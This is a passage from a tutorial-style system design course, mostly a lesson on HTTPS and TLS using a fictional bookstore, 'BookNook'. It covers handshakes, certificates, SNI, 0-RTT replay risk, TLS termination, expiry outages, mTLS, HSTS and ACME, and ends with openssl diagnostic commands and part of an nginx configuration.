3. BookNook stores its session identifier in a cookie with `HttpOnly; Secure; SameSite=Lax`, while its mobile app uses a JWT in the `Authorization` header. Explain why the browser version is vulnerable to one attack class that the mobile version is structurally immune to, and why the mobile version is more exposed to a different attack class. Name both classes and the specific mitigation for each.

**Practical scenario**

4. BookNook launches a flash sale. Within ten minutes: the `/api/checkout` endpoint starts returning `500` to 30 % of requests; clients retry immediately; the error rate climbs to 80 %; and the CDN begins serving one user's cart contents to other users. For each of the three problems, state (a) which status code *should* have been returned and which headers should accompany it, (b) which `Cache-Control` directive was almost certainly wrong and what it should be, and (c) what client-side change prevents the retry amplification. Then name one thing that would have caught the cart-leak before production.

**Calculation**

5. BookNook's API serves **14,000 requests/second** at peak, of which **65 %** are authenticated. You are deciding between a server-side session cookie (**52 bytes** on the wire, one Redis lookup at **0.45 ms**) and a JWT (**720 bytes** on the wire, **0.06 ms** of CPU to verify). There are **3,500,000** registered users and **9 %** have an active session at any time; each session record costs **520 bytes** in Redis.
   (a) How much Redis memory do the sessions need, in MiB?
   (b) How many extra bytes per second and gigabytes per day does the JWT approach put on the wire?
   (c) How many seconds of Redis processing time per second does the session approach consume, and roughly how many Redis cores does that imply?
   (d) At ₹0.80/GB of transfer and ₹2,400 per core-month of Redis, which option is cheaper per year, and by how much? State every assumption you add and show every step.

Reply with your answers and I'll assess them, correct anything shaky, and give model answers before Lesson 7.

---

**Progress checklist**

Phase 1:
- `[x] 1. Client-server architecture`
- `[x] 2. Stateful versus stateless servers`
- `[x] 3. IP addresses, ports, sockets, domain names`
- `[x] 4. DNS resolution and DNS caching`
- `[x] 5. HTTP requests and responses`
- `[x] 6. HTTP methods, headers, cookies, sessions, status codes`
- `[ ] 7. HTTPS and TLS`
- `[ ] 8. TCP versus UDP`
- `[ ] 9. HTTP/1.1 vs HTTP/2 vs HTTP/3`
- `[ ] 10. REST APIs`
- `[ ] 11. RPC and gRPC`
- `[ ] 12. GraphQL`
- `[ ] 13. Synchronous versus asynchronous communication`
- `[ ] 14. Latency, throughput, bandwidth, concurrency`
- `[ ] 15. Availability, reliability, durability, fault tolerance`
- `[ ] 16. Average latency vs p50/p95/p99, tail latency`
- `[ ] 17. Idempotency, retries, timeouts, exponential backoff`

**NEXT LESSON: Phase 1, Topic 7 — HTTPS and TLS**

---

# Lesson 7 — HTTPS and TLS (Conceptual)

*Phase 1, Topic 7*

## 1. Simple definition

**TLS** (Transport Layer Security) is a protocol that wraps an ordinary TCP connection in a layer that makes the bytes unreadable and untamperable by anyone in the middle, and that proves you are talking to the server you intended.

**HTTPS is not a separate protocol.** It is exactly the HTTP of Lessons 5 and 6, written into a TLS-protected connection instead of a bare TCP connection. Same methods, same headers, same status codes, same `\r\n` framing. The only difference is that a TLS handshake happens first, and afterwards every byte is encrypted before it hits the network.

Terms defined before use:

- **Plaintext**: the readable data. **Ciphertext**: the scrambled form.
- **Encryption**: turning plaintext into ciphertext with a key. **Decryption**: the reverse.
- **A key** is just a large secret number. Everything in TLS is about agreeing on one without letting an eavesdropper learn it.
- **SSL** is TLS's predecessor. SSL 2.0 and 3.0 are broken and long dead; people still say "SSL certificate" out of habit. When someone says SSL in 2026, they mean TLS.
- **Man-in-the-middle (MITM)**: anyone positioned between you and the server who can read or modify traffic — a café Wi-Fi router, an ISP, a compromised network switch, a hostile government.

## 2. Why it exists

The internet is a chain of machines you do not control. A request from a laptop in Pune to a server in Mumbai passes through a home router, an ISP, two or three transit networks, and a cloud provider's edge. **Every one of those can read and modify plain HTTP.**

Three concrete attacks that plain HTTP permits:

1. **Passive eavesdropping.** The café Wi-Fi operator reads your session cookie from Lesson 6 and replays it. They are now logged in as you. No exploit needed — the cookie travels in plaintext.
2. **Active tampering.** An ISP injects advertising JavaScript into pages. This was not hypothetical; several large ISPs did it routinely in the 2010s. The same mechanism can inject malware.
3. **Impersonation.** You type `booknook.com` and an attacker who controls DNS or BGP routing (Lesson 4) serves you their own server. Without authentication you cannot tell the difference — the page looks identical.

TLS addresses all three. It is also now effectively mandatory for reasons beyond security: browsers mark plain HTTP as "Not secure", HTTP/2 and HTTP/3 are only deployed over TLS in practice, and browser APIs like service workers, geolocation, and the clipboard refuse to run on insecure origins.

## 3. Real-world analogy

**A sealed, tamper-evident diplomatic pouch with a notarised ID check.**

- Before the conversation starts, both parties perform an **ID check**: the server presents a passport (its *certificate*) issued by a government the client already trusts (a *Certificate Authority*).
- The client verifies the passport is genuine, unexpired, and issued to the name it asked for (`booknook.com`).
- They then agree, in public but in a way nobody watching can replicate, on a **shared lock combination** (the session key).
- Every document after that goes in a pouch locked with that combination, **sealed so any tampering is visible**.
- The courier network carries the pouch and can see its size, its destination address, and when it moved — but not its contents.

**Where the analogy breaks down**

| Diplomatic pouch | Real TLS |
|---|---|
| The courier sees only an address | An observer also sees the **hostname you requested** (via SNI, §4.6), the IP, packet sizes, and timing — enough to infer which page you loaded |
| A government issues passports carefully, with interviews | There are ~150 trusted CAs in a browser's root store; **any one of them can issue a certificate for any domain**, and several have been compromised historically |
| A sealed pouch proves the contents are legitimate | TLS proves the *channel* is authentic. It says nothing about whether the server's code is secure, its database is encrypted, or the site is a phishing clone with a perfectly valid certificate |
| The pouch is opened only at the destination | In production the pouch is usually opened at the **load balancer** and re-sealed for the internal hop (TLS termination, §4.8) |
| A passport is valid for ten years | Certificates now last **≤ 47 days** at the strict end and 90 days typically. Expiry is one of the most common causes of outages (§4.9) |
| Both parties show ID | Normally only the **server** proves identity. The client proves nothing unless you deploy mTLS (§4.10) |

## 4. Detailed technical explanation

### 4.1 What TLS guarantees — exactly three things

| Guarantee | Plain English | Mechanism | What breaks without it |
|---|---|---|---|
| **Confidentiality** | Nobody in the middle can read the bytes | Symmetric encryption (AES-GCM, ChaCha20-Poly1305) | Session cookies, passwords, and order data readable by anyone on the path |
| **Integrity** | Nobody can modify the bytes undetected | Authenticated encryption (AEAD) produces a tag that fails verification on any change | ISPs inject ads; attackers flip bits in your JavaScript |
| **Authentication** | You are talking to the real `booknook.com` | Certificate chain validated against the OS/browser root store | DNS or BGP hijack silently sends you to an impostor |

Note the ordering of importance. Confidentiality is what people think of; **authentication is what actually stops the worst attacks**. An encrypted connection to an attacker's server is worth nothing.

### 4.2 What TLS does **not** give you

This list matters more than the previous one, because overconfidence here causes real breaches.

- **TLS does not make your application secure.** SQL injection, XSS, broken authorisation, IDOR, and leaked API keys are all completely unaffected. A padlock icon next to a vulnerable app is a padlock on a door with no walls.
- **TLS does not hide which site you visited.** The **SNI** field in the handshake carries the hostname in **plaintext** (§4.6). An observer learns you connected to `booknook.com`, even if not which book you viewed. (Encrypted Client Hello / ECH is the emerging fix, not yet universal.)
- **TLS does not hide your IP address or the server's.** Those are in the IP header, below TLS entirely. Combined with reverse DNS, the destination is often identifiable even without SNI.
- **TLS does not hide traffic volume or timing.** Request sizes and inter-packet timing leak a surprising amount: which video you streamed, which page you loaded, even typed-password length in some conditions. This is "traffic analysis", and padding defences are rare in practice.
- **TLS does not protect data at rest.** Once the bytes land on the server they are plaintext in memory, in logs, and in the database unless you encrypt those separately (Phase 3).
- **TLS does not verify the operator is honest.** A phishing site at `b00knook.com` gets a free, perfectly valid certificate in 60 seconds. The padlock means "the channel is private", not "this site is trustworthy". Teaching users "look for the padlock" was a decades-long security mistake.
- **TLS does not protect against a compromised endpoint.** Malware on the client reads plaintext before it is ever encrypted.
- **TLS does not prevent a trusted-CA mis-issuance.** If any CA in the root store issues a fraudulent certificate for your domain, clients accept it. Certificate Transparency logs are the detection mechanism, not a prevention one.

### 4.3 Symmetric versus asymmetric cryptography, conceptually

No mathematics required; only the shapes matter.

**Symmetric encryption**: one key, used for both locking and unlocking. Like a physical door key you copy and share.

- Fast — modern CPUs have AES instructions and do multiple gigabytes per second per core.
- **The problem**: both sides need the same key. How do you deliver it over a network an attacker is watching? You cannot simply send it.

**Asymmetric (public-key) cryptography**: a mathematically linked *pair* of keys. What one locks, only the other opens.

- The **public key** can be published to the world.
- The **private key** never leaves the server.
- Two useful operations follow:
  - **Encrypt to a public key** → only the private key holder can read it.
  - **Sign with a private key** → anyone with the public key can verify the signature, proving the holder produced it and the content is unchanged.
- **The problem**: it is slow — roughly 100–1,000× slower than symmetric for bulk data.

**TLS uses both, for exactly the right job each.** The handshake uses asymmetric cryptography to (a) prove the server's identity via signature, and (b) establish a shared secret. Everything after the handshake uses that shared secret with fast symmetric encryption. This is called a **hybrid cryptosystem** and it is the central design idea of TLS.

One refinement worth knowing by name: modern TLS does not encrypt a key *to* the server's public key. It uses **ephemeral Diffie–Hellman** (ECDHE), where both sides contribute random values and derive a shared secret that was never transmitted. The certificate's private key is used only to *sign* the exchange. The benefit is **forward secrecy**: if the server's private key is stolen next year, previously recorded traffic still cannot be decrypted, because the session keys were ephemeral and discarded. Under the old RSA key-exchange, stealing the key would retroactively decrypt every recorded session ever.

### 4.4 Certificates, chains of trust, CAs, and root stores

A **certificate** is a signed document that binds a public key to one or more names. Its important fields:

| Field | Example | Why it matters |
|---|---|---|
| **Subject / CN** | `CN=booknook.com` | Legacy name field; modern clients ignore CN |
| **Subject Alternative Name (SAN)** | `DNS:booknook.com, DNS:www.booknook.com, DNS:*.api.booknook.com` | **This is what is actually checked.** A certificate without a matching SAN entry fails |
| **Public key** | an ECDSA P-256 point | The key whose private half the server holds |
| **Issuer** | `CN=R11, O=Let's Encrypt` | Which CA signed it |
| **Validity** | `notBefore` / `notAfter` | Hard expiry, checked against the **client's clock** |
| **Signature** | bytes | The issuer's signature over all of the above |

**The chain of trust** works by delegation:

```
Root CA certificate          (self-signed; pre-installed in your OS/browser; offline, locked in an HSM)
      |  signs
Intermediate CA certificate  (online, day-to-day issuance; limits root exposure)
      |  signs
Leaf certificate             (booknook.com; what your server presents)
```

The server must send the **leaf plus every intermediate**, but not the root (the client already has it). Forgetting to include the intermediate is a classic deployment bug: it works in Chrome on your laptop (which caches intermediates or fetches them) and fails on Android, Java clients, and `curl`. "Works in my browser, broken in the mobile app" almost always means a missing intermediate.

A **root store** is the list of root CA certificates a platform trusts — maintained separately by Mozilla, Apple, Microsoft, Google, and most Linux distributions. It contains roughly 100–150 roots. **Any of them can issue a certificate for any domain.** That is the structural weakness of the CA system, and the reason **Certificate Transparency** exists: every issued certificate must be published to public append-only logs, so a domain owner can detect mis-issuance. You can monitor your own domains for free via CT log search.

**Validation levels** (worth knowing so you are not upsold):

- **DV (Domain Validated)**: proves you control the domain. Automated, free, issued in seconds.
- **OV / EV (Organisation / Extended Validation)**: additionally verifies the legal entity. **Browsers removed the special EV indicator in 2019** because studies showed users never noticed it. EV certificates now provide no user-visible benefit and no cryptographic benefit. Do not pay for them expecting security.

### 4.5 The handshake: TLS 1.2 versus TLS 1.3

**TLS 1.2 — two round trips before application data.**

```
Client                                               Server
  |---- ClientHello ------------------------------------>|   versions, cipher suites, random
  |<--- ServerHello, Certificate, ServerKeyExchange, -----|   choice, cert chain, DH params
  |     ServerHelloDone                                   |
  |---- ClientKeyExchange, ChangeCipherSpec, Finished -->|   client's DH share
  |<--- ChangeCipherSpec, Finished ----------------------|
  |---- HTTP GET ---------------------------------------->|   finally, application data
                                   = 2 RTT of handshake
```

**TLS 1.3 — one round trip.** The client *guesses* the key-exchange group and sends its share in the very first message. The server usually guesses right and replies with everything needed.

```
Client                                               Server
  |---- ClientHello + key_share ------------------------->|
  |<--- ServerHello + key_share, {Certificate},  ---------|   (braces = already encrypted)
  |     {Finished}                                        |
  |---- {Finished} + HTTP GET --------------------------->|
                                   = 1 RTT of handshake
```

TLS 1.3 also *removed* every legacy option: no RSA key exchange (so forward secrecy is mandatory), no CBC-mode ciphers, no compression, no renegotiation, no SHA-1. **Five cipher suites total**, down from dozens. Fewer options means fewer misconfigurations — a security win that is really a usability win.

**Latency table.** Assume one round trip = RTT. Cost *before the first HTTP byte can be sent*:

| Scenario | TCP | TLS | Total RTTs | At 20 ms RTT | At 80 ms RTT | At 200 ms RTT (mobile/intercontinental) |
|---|---|---|---|---|---|---|
| Plain HTTP, new connection | 1 | 0 | **1** | 20 ms | 80 ms | 200 ms |
| HTTPS, TLS 1.2, new connection | 1 | 2 | **3** | 60 ms | 240 ms | 600 ms |
| HTTPS, TLS 1.3, new connection | 1 | 1 | **2** | 40 ms | 160 ms | 400 ms |
| HTTPS, TLS 1.3, session resumption | 1 | 1 | **2** | 40 ms | 160 ms | 400 ms |
| HTTPS, TLS 1.3, **0-RTT** resumption | 1 | 0 | **1** | 20 ms | 80 ms | 200 ms |
| HTTP/3 (QUIC), new connection | 0* | 1 | **1** | 20 ms | 80 ms | 200 ms |
| HTTP/3 (QUIC), 0-RTT | 0* | 0 | **0** | 0 ms | 0 ms | 0 ms |
| **Existing keep-alive connection** | 0 | 0 | **0** | 0 ms | 0 ms | 0 ms |

\* QUIC merges transport and cryptographic handshakes into one, so there is no separate TCP round trip (Lesson 9 — HTTP/1.1 vs HTTP/2 vs HTTP/3).

Two conclusions worth internalising:

1. **Upgrading TLS 1.2 → 1.3 saves one full RTT** — 80 ms on an intercontinental link, per new connection. It is free; just enable it.
2. **The last row dominates everything.** A reused connection costs **zero**. Connection pooling (Lesson 5, §4.4) is worth more than any handshake optimisation. Optimise reuse first, then the handshake.

### 4.6 SNI — Server Name Indication

Recall Lesson 5, §4.2: many sites share one IP, and the `Host` header selects which. But the certificate must be chosen during the handshake, **before any HTTP byte exists**. Chicken and egg.

**SNI** solves it: the client puts the hostname into the `ClientHello`, in **plaintext**, as the very first message:

```
ClientHello
  server_name = "booknook.com"     <- unencrypted, visible to every observer on the path
  supported_versions = TLS 1.3
  key_share = ...
```

The server reads it and presents the matching certificate.

Two consequences:

- **Operationally essential.** Without SNI you need one IP per certificate. SNI is what makes shared hosting, CDNs, and cloud load balancers economically possible. Only truly ancient clients (Windows XP's IE, Android 2.x) lack it; you can ignore them.
- **Privacy leak.** SNI reveals exactly which site you are visiting, to your ISP and to anyone on the path. It is the basis of most national-scale website blocking: filter on the SNI string. **Encrypted Client Hello (ECH)** encrypts SNI using a public key fetched via DNS, but it requires both broad DNS and server support and is still rolling out. Do not assume ECH in a design today.

### 4.7 0-RTT and its replay risk

**Session resumption**: after a successful handshake, the server issues a *session ticket*. On reconnect the client presents it and both sides resume the previously derived secret instead of redoing the full exchange. Cheaper in CPU, still 1 RTT in TLS 1.3.

**0-RTT (early data)** goes further: the client sends **application data in its very first flight**, encrypted with a key derived from the resumed secret. Zero handshake round trips before the first HTTP request.

The catch is fundamental, not a bug:

> 0-RTT early data has **no replay protection**. An attacker who records the first flight can send those exact bytes again later, and the server will accept and process them as a fresh request.

Why? Because 0-RTT data is sent before any live exchange of fresh randomness; nothing ties it to *this* conversation. Also, 0-RTT data does not have forward secrecy against ticket-key compromise.

The rule follows directly: **only send idempotent requests as 0-RTT**. `GET /books/1492052205` replayed a hundred times is harmless. `POST /orders` replayed is a hundred orders. This is exactly Lesson 6's safe/idempotent table doing real work — browsers and CDNs implement precisely that rule, sending only `GET` as early data. Servers should additionally reject or defer early data on any non-idempotent route, and may use a single-use ticket cache to limit the replay window.

### 4.8 TLS termination and re-encryption

In production the TLS connection usually does **not** reach your application process. It stops at a load balancer, CDN edge, or reverse proxy. That is **TLS termination**.

```
User ==TLS==> CDN edge ==TLS==> Load balancer ==?==> App server
      (TLS #1)         (TLS #2)                (TLS #3 or plaintext)
```

Three deployment patterns:

| Pattern | Internal hop | Pros | Cons | Use when |
|---|---|---|---|---|
| **TLS termination (edge only)** | Plaintext HTTP inside the VPC | Simplest; cheapest CPU; the LB can read headers for routing, caching, WAF | Anyone inside the network perimeter can read traffic; fails most compliance regimes | Small single-VPC systems with a strong network boundary |
| **TLS re-encryption / end-to-end** | A second, separate TLS connection to the backend | Encrypted inside too; LB still inspects and routes | More CPU, more certificates to manage internally | The default for regulated data (payments, health, personal data) |
| **TLS passthrough** | The LB forwards encrypted bytes untouched (Layer 4) | True end-to-end to the app; LB never sees plaintext | **No header-based routing, no caching, no WAF, no cookie-based stickiness** | Strict compliance, or non-HTTP protocols |

Critically, with termination or re-encryption the app server sees a connection from the load balancer over plain HTTP on an internal port. That is why Lesson 5's `X-Forwarded-Proto: https` header exists — your application must honour it, or it will build `http://` redirect URLs and refuse to set `Secure` cookies (Lesson 6).

The modern evolution of re-encryption is a **service mesh** that gives every service a certificate and enforces mTLS automatically between all internal calls (Phase 4, Topic 12 — service mesh), which is also the foundation of zero-trust networking.

### 4.9 Certificate expiry: a top cause of outages

Every certificate has a hard `notAfter` timestamp. The instant it passes, **every client refuses the connection** with a full-screen interstitial browser warning, or a hard error in an API client. There is no graceful degradation, no partial failure, no slow ramp. It is a cliff.

Why it keeps happening to competent teams:

- It is a **time bomb with a long fuse**. The person who installed the certificate left the company 18 months ago.
- It fails **everywhere at once**, including on internal services and in CI, so your recovery tooling may be broken too.
- Monitoring frequently covers the public endpoint but not the internal mTLS certificates, the certificate on the admin panel, the client certificate used for a partner API, or the one inside a container image.
- The industry is moving to **much shorter lifetimes** — the CA/Browser Forum has agreed on a schedule reducing maximum certificate lifetime to **47 days by 2029**. Manual renewal becomes impossible by design; automation is the only option.

Practical defences, in priority order:
1. **Automate issuance and renewal with ACME** (§4.11). Renew at one-third of remaining lifetime so you have many retry opportunities.
2. **Alert on days-to-expiry** at 30, 14, and 7 days, from an *external* monitor that connects and reads the certificate, not from a config file.
3. **Inventory every certificate**, including internal, client, and partner ones. The one you forget is the one that expires.
4. **Test the renewal path**, not just the certificate. A renewal script that has silently failed for six months looks identical to a working one until the last day.

### 4.10 mTLS — mutual TLS

In ordinary TLS only the *server* proves its identity. In **mutual TLS**, the client also presents a certificate and the server validates it against its own trusted CA.

- The client's identity becomes cryptographic rather than a bearer token: there is nothing to steal and replay, because the private key never leaves the client.
- It is immune to the Lesson 6 problems — no CSRF, no token exfiltration via XSS, no `Authorization` header to leak into logs.
- The cost is **certificate lifecycle management for every client**: issuance, distribution, rotation, and revocation. That is painful for millions of browsers and entirely reasonable for a few hundred services.

Where mTLS is the right answer: service-to-service authentication inside a cluster (usually automated by a service mesh with certificates rotated hourly), high-value partner API integrations (payment processors commonly require it), and device fleets (IoT, point-of-sale terminals).

Where it is the wrong answer: consumer browsers. The enrolment UX is hostile and recovery when a user changes device is worse.

### 4.11 HSTS

Consider the gap: a user types `booknook.com`. The browser's first request goes to `http://booknook.com`, gets a `301` to `https://`, and *then* connects securely. **That first plaintext request is attackable.** An attacker on the path intercepts it and simply serves a plaintext proxy of your site, never allowing the upgrade — an "SSL stripping" attack. The user sees no padlock, and most users never notice.

**HSTS (HTTP Strict Transport Security)** closes this with a response header:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | Effect |
|---|---|
| `max-age=31536000` | For one year, this browser will **refuse** to make any plaintext request to this host; it rewrites `http://` to `https://` internally before sending anything |
| `includeSubDomains` | Applies to every subdomain. Powerful and dangerous — any subdomain without a valid certificate becomes unreachable |
| `preload` | Requests inclusion in a list **compiled into browsers**, so even the very first visit is protected |

HSTS also removes the "click through the warning" escape: with HSTS active, certificate errors become non-bypassable.

Two serious cautions:
- **`preload` is effectively irreversible.** Removal takes months to propagate through browser releases. Do not preload until HTTPS is solid across *every* subdomain.
- Roll out `max-age` gradually: 300 seconds, then a day, then a week, then a year. A mistake with `max-age=31536000; includeSubDomains` can make an internal subdomain unreachable for a year for every user who visited once.

### 4.12 Let's Encrypt and ACME automation

**ACME** (Automatic Certificate Management Environment) is the protocol that turned certificates from a yearly purchasing exercise into a background daemon.

How it works, conceptually:

1. Your client (certbot, `lego`, Caddy's built-in, cert-manager in Kubernetes) asks the CA for a certificate for `booknook.com`.
2. The CA issues a **challenge** proving you control that domain, in one of two common forms:
   - **HTTP-01**: serve a specific token at `http://booknook.com/.well-known/acme-challenge/<token>`. Simple; cannot issue wildcards; requires port 80 reachable.
   - **DNS-01**: publish a specific TXT record at `_acme-challenge.booknook.com` (Lesson 4). Works behind firewalls and **is required for wildcard certificates**; needs API access to your DNS provider.
3. The CA verifies the challenge, then signs and returns the certificate.
4. The client installs it and schedules renewal, typically at **one-third of remaining lifetime** — for a 90-day certificate that is day 60, leaving 30 days of retries before anything breaks.

Let's Encrypt issues **DV certificates, free, 90-day lifetime, fully automated**, and now secures a large majority of the public web. Practical guidance:

- Use a client that renews automatically and **monitor the renewal**, not just the certificate.
- Respect rate limits (per registered domain per week); use the staging environment while testing or you will lock yourself out.
- Prefer DNS-01 if you need wildcards or if port 80 is not publicly reachable.
- For internal services, run a private CA (cert-manager, Vault, or a cloud private CA) rather than using public certificates for private names.

## 5. Request / data flow

A BookNook user's first HTTPS request of the day, every step:

1. User types `booknook.com`. The browser consults its **HSTS list**; `booknook.com` is present, so it rewrites to `https://booknook.com` **without ever sending a plaintext request**.
2. DNS resolution returns `203.0.113.10` (Lesson 4).
3. TCP three-way handshake to `203.0.113.10:443` — **1 RTT** (Lesson 8).
4. Browser sends `ClientHello`: supported TLS versions (1.3 preferred), cipher suites, a random nonce, an **ECDHE key share**, and **SNI = `booknook.com` in plaintext**.
5. The CDN edge terminating TLS reads SNI and selects the certificate for `booknook.com`.
6. Server replies `ServerHello` with its chosen cipher suite, its own random nonce, and its **ECDHE key share**. From this point every further handshake message is already encrypted.
7. Both sides independently compute the same shared secret from their own private value plus the peer's public share. **The secret itself never crossed the network.**
8. Server sends its **certificate chain** (leaf + intermediate) and a **signature** over the handshake transcript, proving it holds the private key matching the certificate.
9. Browser validates, in order: signature chains to a trusted root; `notBefore`/`notAfter` bracket the current clock; a SAN entry matches `booknook.com`; the certificate is not revoked (OCSP stapling or CRLite); and the certificate appears in Certificate Transparency logs.
10. Any failure here produces a **full-page, non-bypassable warning** (non-bypassable because HSTS is active). No HTTP is sent.
11. Browser sends `Finished`. Handshake complete — **1 RTT for TLS**. Total so far: 2 RTTs.
12. Browser now sends the ordinary HTTP request from Lesson 5 — `GET / HTTP/1.1`, `Host: booknook.com`, cookies, `Accept-Encoding` — encrypted with the symmetric session key.
13. CDN edge decrypts, inspects the request, finds a cache miss, and opens (or reuses) a **separate TLS connection** to the origin load balancer — re-encryption.
14. The load balancer decrypts, adds `X-Forwarded-For` and `X-Forwarded-Proto: https`, and forwards to an app server over the internal network — plaintext HTTP inside the VPC, or a third TLS connection if the compliance regime requires it.
15. The app server generates the response. It sets `Secure` cookies only because it trusts `X-Forwarded-Proto: https`; without that header it would silently refuse.
16. The response flows back, is encrypted at each hop, and reaches the browser.
17. The server issues a **session ticket**. The connection stays open (keep-alive). All 59 remaining requests for the page pay **zero** handshake cost.
18. Tomorrow, the browser can use the ticket to resume in 1 RTT, or send a `GET` as **0-RTT early data** — never a `POST`.

## 6. ASCII diagram

```
 WHERE TLS SITS (it is a layer, not a protocol swap)
 +---------------------------------------------------+
 |  HTTP  - methods, headers, status codes (L5, L6)   |  <- UNCHANGED by HTTPS
 +---------------------------------------------------+
 |  TLS   - handshake, then symmetric encryption      |  <- the only addition
 +---------------------------------------------------+
 |  TCP   - reliable ordered byte stream (L8)         |
 +---------------------------------------------------+
 |  IP    - addressing and routing (L3)               |  <- IPs are VISIBLE
 +---------------------------------------------------+

 TLS 1.2 HANDSHAKE = 2 RTT                TLS 1.3 HANDSHAKE = 1 RTT
 Client            Server                 Client            Server
   |-- ClientHello ---->|                   |-- ClientHello -->|
   |<-- ServerHello     |                   |   + key_share    |
   |<-- Certificate     |  RTT 1            |<-- ServerHello --|  RTT 1
   |<-- ServerKeyExch   |                   |   + key_share    |
   |<-- HelloDone       |                   |   {Certificate}  |
   |-- ClientKeyExch -->|                   |   {Finished}     |
   |-- ChangeCipher --->|  RTT 2            |-- {Finished} --->|
   |<-- Finished -------|                   |-- HTTP GET ----->|  (data in flight 1)
   |-- HTTP GET ------->|

 TIME TO FIRST HTTP BYTE (RTT = 80 ms)
   existing keep-alive connection ..................   0 ms   <<< ALWAYS OPTIMISE THIS FIRST
   HTTP/3 0-RTT ....................................   0 ms
   HTTP/3 new / TLS1.3 0-RTT .......................  80 ms
   TLS 1.3 new connection (TCP 1 + TLS 1) .......... 160 ms
   TLS 1.2 new connection (TCP 1 + TLS 2) .......... 240 ms

 CHAIN OF TRUST                          WHAT AN OBSERVER STILL SEES
  [ Root CA ]  in your OS root store      +-------------------------------+
       | signs                            | your IP        -> VISIBLE     |
  [ Intermediate CA ] online              | server IP      -> VISIBLE     |
       | signs                            | SNI hostname   -> VISIBLE (!) |
  [ Leaf: booknook.com ] on your server   | bytes / timing -> VISIBLE     |
   server MUST send leaf + intermediate.  | URL path       -> hidden      |
   Omitting intermediate = "works in      | headers/cookies-> hidden      |
   Chrome, broken on Android".            | body           -> hidden      |
                                          +-------------------------------+

 TERMINATION PATTERNS
  (a) terminate at edge
      user ==TLS==> [LB] --plain HTTP--> app     (simplest, weakest internally)
  (b) re-encrypt
      user ==TLS==> [LB] ==TLS==> app            (LB can still route/cache/WAF)
  (c) passthrough
      user =========TLS=========> app            (LB is blind: no routing, no cache)
```

## 7. Detailed example

### BookNook's TLS posture, end to end

| Layer | Configuration | Why |
|---|---|---|
| DNS | CAA record `0 issue "letsencrypt.org"` | Instructs all other CAs not to issue for this domain — cheap mitigation of the "any CA can issue for any domain" problem |
| Edge (CDN) | TLS 1.3 and 1.2 only; TLS 1.0/1.1 disabled | 1.0/1.1 are deprecated and fail PCI compliance |
| Certificate | Let's Encrypt DV, ECDSA P-256, SANs for `booknook.com`, `www.booknook.com`, `api.booknook.com` | ECDSA signatures are ~10× cheaper to compute than RSA-2048 and the certificate is smaller — less handshake CPU and fewer bytes |
| Renewal | cert-manager with DNS-01, renews at day 60 of 90 | 30 days of retry headroom; DNS-01 supports a wildcard for `*.booknook.com` |
| HSTS | `max-age=31536000; includeSubDomains; preload` | Only enabled after verifying *every* subdomain serves valid HTTPS |
| Edge → origin | **Re-encryption** with an internal private-CA certificate | Payment data crosses the public internet between CDN and origin |
| Origin LB → app | Plaintext inside the VPC, with `X-Forwarded-Proto: https` | Accepted risk, documented; the service mesh migration to mTLS is planned (Phase 4) |
| Payment service | **mTLS** to the payment processor | The processor requires a client certificate; bearer tokens are not accepted |
| Monitoring | External probe checks days-to-expiry on 14 endpoints, alerts at 30/14/7 days | Covers internal and partner certificates, not just the public site |

**The incident that shaped this setup.** BookNook's `api.booknook.com` certificate was issued manually in year one. At 02:14 on a Sunday it expired. Within 90 seconds every mobile app request failed with a TLS error — not a `5xx`, so the HTTP error-rate alerts never fired. The on-call dashboard showed *zero* errors because requests never reached the application. Detection came from a drop in request volume 22 minutes later. Mean time to recovery was 71 minutes, most of it spent discovering that the renewal required a DNS change that needed an account nobody on call had. Post-incident actions: ACME automation everywhere, external certificate-expiry monitoring, and alerting on *traffic volume drop* as well as error rate — because **a TLS failure is invisible to application-level monitoring**.

### Contrasting example: an internal microservice mesh

BookNook's internal `inventory-service` talks to `pricing-service` thousands of times per second. Completely different constraints:

| | Public edge (browser → CDN) | Internal mesh (service → service) |
|---|---|---|
| Who authenticates | Server only | **Both** — mTLS, every call |
| CA | Public (Let's Encrypt), in every browser's root store | **Private CA**; no public trust, no CT logs |
| Certificate lifetime | 90 days | **24 hours or less**, rotated automatically by the mesh sidecar |
| Identity meaning | "This is booknook.com" | "This workload is `spiffe://booknook/ns/prod/sa/pricing`" |
| Handshake cost | Matters enormously (one per user, 80–200 ms RTT) | Nearly irrelevant — connections are long-lived and pooled, RTT is 0.3 ms |
| Revocation | OCSP / CRLite, slow and partial | Trivial — just stop reissuing; certificates expire within hours |
| SNI privacy | A genuine concern | Irrelevant; the network is private |
| Failure mode | A full-page browser warning seen by millions | A failed RPC, retried by the mesh |

The transferable insight: **certificate lifetime is inversely proportional to how automated your issuance is.** Public certificates last 90 days because humans are sometimes involved. Mesh certificates last an hour because nothing human is in the loop — and a one-hour certificate makes revocation a non-problem.

## 8. Code or configuration example

**These snippets illustrate the concepts and are not production-ready.** Real deployments should use a managed load balancer or a server with safe defaults (Caddy, for instance, does all of this automatically) rather than hand-tuning TLS parameters.

Inspect a real handshake — the single most useful TLS debugging skill:

```bash
# Full handshake detail: protocol version, cipher, chain, and validation result.
openssl s_client -connect booknook.com:443 -servername booknook.com </dev/null
#                                           ^^^^^^^^^^ sends SNI. OMIT IT and you may
#                                           get the WRONG certificate back -- this is the
#                                           most common cause of "openssl says it's broken
#                                           but the browser is fine".

# Just the expiry dates. Run this from an EXTERNAL monitor, not from the server itself.
echo | openssl s_client -connect booknook.com:443 -servername booknook.com 2>/dev/null \
  | openssl x509 -noout -dates -subject -issuer

# Show every certificate the server actually sent. If you see only ONE certificate,
# the intermediate is missing: it will work in Chrome and fail on Android and in Java.
openssl s_client -connect booknook.com:443 -servername booknook.com -showcerts </dev/null

# Confirm which SANs the certificate covers. The browser checks SAN, NOT the CN field.
echo | openssl s_client -connect booknook.com:443 -servername booknook.com 2>/dev/null \
  | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# Prove an old protocol is refused. This SHOULD fail.
openssl s_client -connect booknook.com:443 -tls1_1 </dev/null
```

Nginx, annotated:

```nginx
server {
    listen 443 ssl http2;
    server_name booknook.com www.booknook.com;

    # Leaf + intermediate concatenated, leaf FIRST. Omitting the intermediate is
    # the classic "works in Chrome, broken on Android" bug.
    ssl_certificate     /etc/letsencrypt/live/booknook.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/booknook.com/privkey.pem;

    # ONLY 1.3 and 1.2. TLS 1.0/1.1 are deprecated and fail PCI DSS.
    ssl_protocols TLSv1.3 TLSv1.2;

    # For TLS 1.2 only: AEAD ciphers with ECDHE => forward secrecy.
    # TLS 1.3 ignores this list; its five suites are all safe by construction.
